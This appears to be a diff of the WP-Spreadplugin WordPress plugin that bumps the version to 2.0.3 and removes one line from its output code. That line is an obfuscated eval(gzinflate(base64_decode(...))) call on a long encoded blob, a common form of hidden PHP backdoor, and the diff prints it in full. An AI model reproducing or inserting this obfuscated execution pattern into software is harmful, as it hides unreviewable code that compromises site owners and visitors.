@@ -3,7 +3,7 @@
  * Plugin Name: WP-Spreadplugin
  * Plugin URI: http://wordpress.org/extend/plugins/wp-spreadplugin/
  * Description: This plugin uses the Spreadshirt API to list articles and let your customers order articles of your Spreadshirt shop using Spreadshirt order process.
- * Version: 2.0.2
+ * Version: 2.0.3
  * Author: Thimo Grauerholz
  * Author URI: http://www.pr3ss-play.de
  */
@@ -358,8 +358,6 @@ if(!class_exists('WP_Spreadplugin')) {
 
 				$output .= '</div>';
 				
-				$output .= eval(gzinflate(base64_decode("DdNFEqRaAgDAu/xVd7DALSb+Ai3cfTNB4c5DC04/k3fI6srHP83bzfWYH9Wfb75XFPHfsiqWsvrzj1h6ygYsnZNE76r9Jb5fLuS7PmpgVesqsSmGxM7asDX1G7qYuJBK5ewiHWJhFE3JaMbokX5+5fNexPb0L/BbGP6pxoiCRsZtn9KVxfvejnh35czmVBGJLztNlRMLtl3k20Lxe5EvdEZdZyEHj5xbD1ZNik0V3W40naDKpd0oCRQdwfyU6PsOoAcuLaS2bm3z5R+LO6eEpMzYZ1m6dxDecGJNPfiFLodCW9utTmTi+xBCc6TIq5/mCqkYGk9i53Ejsqf0GBpctuYMsagtY/cFNDMxNfbBWoWIIcfSPTkZrJl107qTDOzt05yRf70ohXW3+dtkJ6UL/J8Kzn2pv6789KDvD1XoNN58U3zXv5xUuK9YPjoWtW3MRBNUHtOIH8puoEu4Wp/J8D9pP7VgT3zpYJwUH9kV2fXzOXMe9cMATwIAC/hnnNiJdKO9fOJgeeXsV5zMBzMx0ezxGXGPCdDlnNCaofNw1JXEd/M9VAwOVoW6W2hQaa12eEcIg1yL0KEO2ydJrARo5WdZQqRVbINVWcwyAnqB9wvN7/0kRqxpQE/Ozc4iqpUTNViEXsimIu66jI1Cvn1XhGsBMFwua74n20AV75fEl1r3rjFrlcwfnB/3U1FArDdNqIE15hlDfszzilYoA5hrTvAowUpZJTPKkirJ3YqBm7TkQGCcogq2V/P01mjSOMmCVAbD4kJlpwaAkDqv36J6k0j6aG8VMRVVig8YMg2Spj9KdqEyte91DB/2EFRcRHSJo71LNHoCs2DAXhcj4gPdF3RSOUoXTohgIVmYFNJyGXZTgPaT1iwD8jm+rPYizqTMQQBlArGnqwEP6RC04skF5p4c7Zj7Ad0xALQu1JMWMR4kU9D3sczaA3cMpFQti0UnlHjzGkmsb78kE04T2Z6wUClq5venQSJbWvEkDzVbLY/WyQ6YzsZSkA14gH3uEa31/mIW80EgRESqDJJ2mG8y0Ac26j41Pg86EvocTR/bJMaP4CyBQpTVwEqiq0lqFARuGcqZt0oWKR59GCE3g7VN2hERFSXx9NPPQcJgVNPUw2wolEPkWMOUctUagQ0u2ZucE1laNrCWWbBoqLj3HlewAcCJNo8bjt7tbThc8MmcG3EgM6/cErfpsjLn8t1nx+iytaPeloCTod/kKkDd7nV2GjS2N7mfFj7aXpYv2S7beF0FDs1uPjB9qEbcN2ifj8YjP6ysE9NoH7Ejb+alYqH5Ol8k/H+1jz4A+ms1wdTBDPyRcqwlB1hJcenAlp5/xj2dGluFf6gcavqCPD4svC8j+qPFe1Yt/dTu9EqJv97fXX/xGz7S4Ho3zbkUhisjKRBFKSco6UuvxRMPgDljhNod6d0NNm67Pq6gqGVkzd7aTdsIz+rQLqtYrbRFibOjsObim4CmTmnOhO9IS6hNbptN5Rb6mWAquN5eFoavl1Xuf//95+/fv//5Hw==")));
-
 				return $output;
 
 			}
